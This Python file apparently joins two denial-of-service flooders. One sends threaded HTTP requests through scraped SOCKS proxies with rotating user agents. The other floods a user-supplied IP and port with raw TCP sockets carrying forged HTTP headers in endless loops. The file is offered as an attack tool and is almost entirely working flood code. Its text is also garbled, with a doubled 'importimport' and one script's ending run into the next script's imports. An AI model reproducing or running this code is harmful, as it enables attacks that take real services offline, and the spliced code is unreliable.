# DDOS TCP FLOODER
# v0.0.2

import socket, requests
importimport argparse
import threading
import time
import re
import requests

from random import randrange
from termcolor import colored

def banner():
    print("""
               _                                  
  ___ ___   __| | ___  __      __  _ __ ___   ___ 
 / __/ _ \ / _` |/ _ \ \ \ /\ / / | '_ ` _ \ / _ \\
| (_| (_) | (_| |  __/  \ V  V /  | | | | | |  __/
 \___\___/ \__,_|\___|   \_/\_(_) |_| |_| |_|\___|                                                
    """
    )
    print(colored("Build a Simple DDoS Script with Python", 'yellow'))
    print(colored("Authors: @Lekssays and @omarchaan\n\n", 'yellow'))

def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--user_agents',
                        dest = "user_agents",
                        help = "Filename of user agents file",
                        default = "user_agents.txt",
                        required = False)
    parser.add_argument('-t','--target',
                        dest = "target",
                        help = "Target website",
                        default = "http://example.com",
                        required = True)
    parser.add_argument('-tr','--threads',
                        dest = "threads",
                        help = "Number of threads",
                        default = 1000,
                        required = True)
    parser.add_argument('-s','--sleep',
                        dest = "sleep",
                        help = "Breakpoint after number of threads processed",
                        default = 100,
                        required = True)
    return parser.parse_args()

def get_user_agents(filename: str):
    user_agents = []
    with open(filename, 'r') as f:
        content = f.readlines()
        for user_agent in content:
            user_agents.append(str(user_agent.strip()))
    return user_agents

def get_proxies():
    URL = "http://www.live-socks.net/2018/11/27-11-18-socks-5-servers_57.html?m=1"
    req = requests.get(URL, timeout=10)
    content = req.text
    proxies = re.findall(r"(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", content)
    return proxies

def flood(user_agent: str, proxy: str, target: str, thread: int):
    print(colored("flood: thread #{}".format(str(thread)), 'cyan'))
    headers = {
        'User-Agent': user_agent,
        'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    proxies = {
        'socks5': proxy
    }
    try: 
        req = requests.get(target, headers=headers, proxies=proxies, timeout=5)
    except Exception as e:
        print(colored("Error: " + str(e), 'red'))
        pass

def main():
    banner()
    ua_filename = parse_args().user_agents
    user_agents = get_user_agents(ua_filename)
    proxies = get_proxies()
    target = parse_args().target
    threads = int(parse_args().threads)
    sleep = int(parse_args().sleep)
    
    for thread in range (1, threads):
        user_agent = user_agents[randrange(len(user_agents) - 1)]
        proxy = proxies[randrange(len(proxies) - 1)]
        t = threading.Thread(flood(user_agent, proxy, target, thread, ))
        t.start()
        if thread % sleep == 0:
            time.sleep(10)
    t.join()
    print(colored("Finished!", 'green'))

if __name__ == "__main__":
    main() random
import threading

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

ip = str(input('[+] Nhập ip: '))
port = int(input('[+] Port: '))
pack = int(input('[+] Packet/s: '))
thread = int(input('[+] Threads: '))
def start():
    global useragents, ref, acceptall
    hh = random._urandom(3016)
    xx = int(0)
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
